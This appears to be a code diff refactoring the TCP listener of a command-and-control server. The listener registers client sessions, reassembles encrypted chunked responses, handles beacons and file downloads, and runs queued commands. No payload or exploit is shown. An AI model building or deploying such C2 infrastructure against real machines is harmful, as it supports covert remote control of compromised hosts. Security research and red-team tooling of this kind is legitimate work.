@@ -1,51 +1,63 @@
 const { createServer } = require('node:net');
 const { logInfo, logError } = require('../modules/logging');
-
 const config = require('../modules/config');
 
-/**
- * Creates the channel connection for net.Socket
- */
+const {
+    getSessionId,
+    decryptData
+} = require('../modules/encdec');
+const {
+    addClientSession,
+    upsertClientSession,
+    getClient
+} = require('../modules/clients');
+const {
+    executeQueuedCommands
+} = require('../modules/queue');
+const {
+    handleDownloadResponse,
+    handleResponse,
+    handleBeacon
+} = require('../modules/handlers');
+
+// Create the TCP server
 const server = createServer((socket) => {
-    const { getSessionId } = require('../modules/encdec');
-    const { addClientSession } = require('../modules/clients');
-    
-    const sessionId = getSessionId(socket.address().address);
-    
+    const clientAddress = socket.remoteAddress || '1';
+    const sessionId = getSessionId(clientAddress);
+
+    // Add client session
     addClientSession(sessionId, socket);
-    
-    socket.on('data', async (payload) => {
+
+    let clientBuffer = '';
+
+    socket.on('data', async (chunk) => {
         try {
-            const { upsertClientSession, getClient } = require('../modules/clients');
-            const { executeQueuedCommands } = require('../modules/queue');
-            const { decryptData } = require('../modules/encdec');
-            const { handleDownloadResponse, handleResponse, handleBeacon } = require('../modules/handlers');
-            
-            const payloadStr = payload.toString('utf8');
-    
+            const payloadStr = chunk.toString('utf8');
             let client = getClient(sessionId);
 
             if (payloadStr.length >= config.data.chunk_size || payloadStr.includes('--FIN--')) {
-                // chunk mode                            
-                upsertClientSession(sessionId, {waiting: true, buffer: client.buffer + payloadStr});
-                client = getClient(sessionId);
+                // Chunk mode
+                clientBuffer += payloadStr;
+                if (clientBuffer.includes('--FIN--')) {
+                    const bufferChunks = clientBuffer.replace('--FIN--', '');
+                    clientBuffer = '';
 
-                if (client.buffer && client.buffer.includes('--FIN--')) {
-                    const bufferChunks = client.buffer.replace('--FIN--', '');
                     const decrypted = await decryptData(bufferChunks, client.sessionId);
                     const parsed = JSON.parse(decrypted);
                     const response = parsed.response;
-                    
+
                     if (response.download) {
                         await handleDownloadResponse(response);
                     } else {
                         await handleResponse(response);
                     }
-                    
-                    upsertClientSession(sessionId, {waiting: false, buffer: ''});
+
+                    upsertClientSession(sessionId, { waiting: false, buffer: '' });
+                } else {
+                    upsertClientSession(sessionId, { waiting: true, buffer: clientBuffer });
                 }
             } else {
-                // non-chunk mode
+                // Non-chunk mode
                 const decrypted = await decryptData(payloadStr, client.sessionId);
                 const parsed = JSON.parse(decrypted);
                 const response = parsed.response;
@@ -61,44 +73,34 @@ const server = createServer((socket) => {
                     await handleResponse(response);
                 }
             }
-        } catch(err) {
-            logError(err.message);
+        } catch (err) {
+            logError(`Error processing data from client ${sessionId}: ${err.message}`);
         }
     });
 
     socket.on('end', () => {
-        const { getClient } = require('../modules/clients');
-        const { upsertClientSession } = require('../modules/clients');
-        
         const client = getClient(sessionId);
-        
-        logInfo(`\nClient ${sessionId} disconnected. IP: ${client.address}`);
-        
-        upsertClientSession(sessionId, {lastSeen: new Date(), active: false});
+        logInfo(`Client ${sessionId} disconnected. IP: ${client.address}`);
+        upsertClientSession(sessionId, { lastSeen: new Date(), active: false });
     });
-    
-    socket.on('error', (err) => {
-        const { getClient } = require('../modules/clients');
-        const { upsertClientSession } = require('../modules/clients');
-        
-        const client = getClient(sessionId);
 
-        logError(`\nClient ${client.sessionId} threw an error: ${err.message}. IP: ${client.address}`);
-        
-        upsertClientSession(sessionId, {active: false});
+    socket.on('error', (err) => {
+        const client = getClient(sessionId);
+        logError(`Client ${sessionId} threw an error: ${err.message}. IP: ${client.address}`);
+        upsertClientSession(sessionId, { active: false });
     });
-    
-    //socket.pipe(socket);
+
+    socket.setKeepAlive(true); // Enable keep-alive to improve connection stability
 });
 
 /**
- * Starts listening on the socket 
+ * Starts listening on the server
  */
 const listenSocketServer = () => {
     server.listen(config.channels.tcp.port, config.server.host);
 
     server.on('error', (err) => {
-        logError(`\nServer threw an error: ${err.message}`);
+        logError(`Server error: ${err.message}`);
         server.close();
     });
 };
@@ -112,12 +114,12 @@ const getServerInstance = () => {
 };
 
 /**
- * Closes the socket server connection
+ * Closes the server connection
  */
 const closeSocketServer = async () => {
     if (server) {
         server.close(() => {
-            logInfo('\nServer connection closed');
+            logInfo('Server connection closed');
             server.unref();
         });
     }
